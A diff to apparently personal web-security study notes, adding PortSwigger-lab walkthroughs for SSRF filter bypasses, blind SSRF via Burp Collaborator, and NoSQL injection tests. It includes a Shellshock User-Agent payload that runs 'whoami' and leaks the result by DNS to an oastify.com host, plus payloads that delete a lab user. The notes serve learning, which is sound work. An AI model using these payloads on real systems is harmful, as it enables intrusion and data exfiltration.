@@ -67,6 +67,7 @@
 - Hackvertor: Encoding and Decoding, data transformation (hashing, encryption, decryptin, convert, string) [SQL injection]
 - Turbo Intruder: sending large numbers of HTTP requests and analyzing the results [Brute-force]
 - Logger++: allows the logs to be searched to locate entries which match a specified pattern [Information disclosure]
+- Collaborator Everywhere: Find SSRF issues; injecting non-invasive headers designed to reveal backend systems by causing pingbacks to Burp Collaborator [Blind SSRF]
   
 ## SQL Injection
 **How to detect**     
@@ -1106,8 +1107,12 @@ Read up: [Smashing the state machine: The true potential of web race conditions]
 **SSRF types**
 - Basic SSRF
   `GET /fetch?url=http://internal-service.local/admin`
-- Blind SSRF (cannot see the response but can infer based on response times or logs)
+- Blind SSRF 
+  - cannot see the response but can infer based on response times or logs   
+  - trigger an HTTP request to an external system that you control, and monitoring for network interactions
+  - using out-of-band (OAST) technique **(Burp Collaborator)**
   `GET /fetch?url=http://internal-service.local/admin/slow-endpoint`
+  
 - SSRF to Access Internal Services
   `GET /fetch?url=http://localhost:8080/admin`
 - SSRF to Access Cloud Metadata Services
@@ -1123,6 +1128,11 @@ Read up: [Smashing the state machine: The true potential of web race conditions]
   `GET /fetch?url=http://external-service.com/api?token=secret`
 - SSRF to Exploit Third-Party APIs
   `GET /fetch?url=http://api.thirdparty.com/userinfo?user_id=admin`
+
+**Finding hidden attack surface for SSRF**
+- parameter: URL, HTTP headers (host, X-forwarded-for, referer), form fields, JSON/XML   
+- file uploads, image fetching, SSO, OAuth callback, APIs   
+- Tools: SSRFmap, FFUF/Dirsearch   
 
 **SSRF blacklisting bypass**
 - **URL encoding**   
@@ -1184,20 +1194,86 @@ Read up: [Smashing the state machine: The true potential of web race conditions]
   - Bypass blocking of http://127.0.0.1/, 'admin'
   - `http://127.1/` OK
   - double url encoding of 'admin' `http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65`
-- SSRF with whitelist-based input filter
+- SSRF with **whitelist-based** input filter
   - http://127.0.0.1/ >  "External stock check host must be stock.weliketoshop.net"
   - http://**user**@stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1 > embed credential accepted
   - http://**user#**@stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1 > # accepted
   - http://localhost%2523@stock.weliketoshop.net > double encode '#' accepted
   - http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos > delete user   
-- ddd
-- ddd
-- ddd
+- SSRF with filter bypass via **open redirection** vulnerability
+  - Next product traffic: GET /product/nextProduct?currentProductId=1&path=/product?productId=2
+  - Check stock traffic: POST /product/stock stockApi=/product/stock/check?productId=1&storeId=2
+  - stockApi=/product/nextProduct?currentProductId=1&`path=http://192.168.0.12:8080/admin/delete?username=carlos` (Ctrl U encode)   
+- Blind SSRF with **out-of-band** detection
+  - Referer: https://0ac500a803221534816908d700410028.web-security-academy.net/
+  - `Referer: http://pf84dopkq16zh0dq128f4xvqiho8c10q.oastify.com`
+  - Copy collaborator and replace the referrer url > Goback Collaborator > click Poll now   > DNS records are showing
+- Blind SSRF with **Shellshock** exploitation
+  - Install Burp Extension '**Collaborator Everywhere**'
+  - Add the target site to scope so that Collaborator Everywhere will target it
+  - Navigate the site
+  - Under 'Issues' panel, collaborator Pingback (HTTP): User-Agent > click on the requeest > send to intruder
+  - Copy collaborator domain   
+  - Replace user agent string > `() { :; }; /usr/bin/nslookup $(whoami).jm9ykiwexvdtoukk8wf9br2kpbv2jw7l.oastify.com`
+  - Replace referrer: http://192.168.0.§1§:8080
+  - Payloads 1 - 255
+  - Poll now > The Collaborator server received a DNS lookup of type A for the domain name **peter-JsfgSS**.jm9ykiwexvdtoukk8wf9br2kpbv2jw7l.oastify.com.   
 
 ## NoSQL Injection
-Content for NoSQL Injection...
+Impact: Bypass authentication or protection; Extract or edit data; DoS; Execute code   
+Types: synxtax (break the NoSQL query syntax), operator (manipulate queries)
 
+**NoSQL Injection Usage and Knowledge**
+| **Syntax/Operator/Condition**  | **Description**                                                                    | **Example**                                                      |
+|--------------------------------|------------------------------------------------------------------------------------|------------------------------------------------------------------|
+| `db.collection.find()`         | Retrieves documents from a collection. Can be manipulated for injection.           | `db.users.find({name: "John"})`                                  |
+| `db.collection.insertOne()`    | Inserts a single document into a collection.                                        | `db.users.insertOne({name: "John", age: 30})`                    |
+| `db.collection.insertMany()`   | Inserts multiple documents into a collection.                                       | `db.users.insertMany([{name: "John", age: 30}, {name: "Jane", age: 25}])` |
+| `db.collection.updateOne()`    | Updates a single document in a collection.                                          | `db.users.updateOne({name: "John"}, {$set: {age: 31}})`          |
+| `db.collection.updateMany()`   | Updates multiple documents in a collection.                                         | `db.users.updateMany({age: {$gt: 25}}, {$set: {status: "active"}})` |
+| `db.collection.deleteOne()`    | Deletes a single document from a collection.                                        | `db.users.deleteOne({name: "John"})`                             |
+| `db.collection.deleteMany()`   | Deletes multiple documents from a collection.                                       | `db.users.deleteMany({age: {$lt: 20}})`                          |
+| `db.collection.findOne()`      | Retrieves a single document from a collection.                                      | `db.users.findOne({name: "John"})`                               |
+| `$and`                         | Combines multiple conditions with logical AND. Commonly used in injection attempts. | `db.users.find({$and: [{age: {$gt: 25}}, {status: "active"}]})`  |
+| `$or`                          | Combines multiple conditions with logical OR. Often exploited in injections.        | `db.users.find({$or: [{age: {$lt: 20}}, {status: "inactive"}]})` |
+| `$not`                         | Negates a condition. Can be used to bypass filters.                                  | `db.users.find({age: {$not: {$lt: 20}}})`                        |
+| `$in`                          | Matches any of the values specified in an array. Useful in crafting injections.     | `db.users.find({status: {$in: ["active", "pending"]}})`          |
+| `$nin`                         | Matches none of the values specified in an array.                                   | `db.users.find({status: {$nin: ["active", "pending"]}})`         |
+| `$exists`                      | Matches documents that have the specified field.                                    | `db.users.find({email: {$exists: true}})`                        |
+| `$regex`                       | Matches documents where the value of a field matches the specified regular expression. Useful for injections. | `db.users.find({name: {$regex: "^J"}})`                          |
+| `$eq`                          | Matches documents where the value of a field equals the specified value.            | `db.users.find({age: {$eq: 25}})`                                |
+| `$ne`                          | Matches documents where the value of a field does not equal the specified value.    | `db.users.find({age: {$ne: 25}})`                                |
+| `$gt`                          | Matches documents where the value of a field is greater than the specified value.   | `db.users.find({age: {$gt: 25}})`                                |
+| `$gte`                         | Matches documents where the value of a field is greater than or equal to the specified value. | `db.users.find({age: {$gte: 25}})`                               |
+| `$lt`                          | Matches documents where the value of a field is less than the specified value.      | `db.users.find({age: {$lt: 25}})`                                |
+| `$lte`                         | Matches documents where the value of a field is less than or equal to the specified value. | `db.users.find({age: {$lte: 25}})`                               |
+| `$type`                        | Matches documents where the field is of the specified type.                         | `db.users.find({age: {$type: "int"}})`                           |
+| `$mod`                         | Performs a modulo operation on the value of a field and matches documents.          | `db.users.find({age: {$mod: [5, 0]}})`                           |
+| `$text`                        | Performs a text search on the content of the fields indexed with a text index.      | `db.users.find({$text: {$search: "John"}})`                      |
+| `$geoWithin`                   | Matches documents with geospatial data within a specified shape.                    | `db.places.find({location: {$geoWithin: {$centerSphere: [[-73.9667, 40.78], 0.01]}}})` |
+| `$size`                        | Matches any array with the number of elements specified.                            | `db.users.find({hobbies: {$size: 3}})`                           |
+| `1=1`                          | Common injection payload used to bypass conditions.                                | `db.users.find({$where: "1==1"})`                                |
+| `{} = {}`                      | Always-true condition for NoSQL injection.                                          | `db.users.find({$where: "{}=={}"})`                              |
+
+**Best practices**
+- input validation - sanitize, whitelist allowed inputs
+- parameterized queries - avoid dynamic queries
+- ORM/ODM framework
+  
 ### NoSQL Injection Lab
+- Detecting NoSQL injection
+  - URL encode all payloads chrs
+  - Test for syntax error
+    - Syntax error: `'` > Command failed with error 139 (JSInterpreterFailure): &apos;SyntaxError: unterminated string literal
+    - Correct Syntax: `Gifts'+'`> no error
+  - Test for different response via Boolean condition
+    - false: `Gifts' && 0 && 'x` > no listing
+    - true: `Gifts' && 1 && 'x`> product listing
+  - Submit a always true condition
+    `Gifts'||1||'` > list out all products
+- Exploiting NoSQL operator injection to bypass authentication
+- Exploiting NoSQL injection to extract data
+- Exploiting NoSQL operator injection to extract unknown fields   
 
 ## XXE Injection
 Content for XXE Injection...
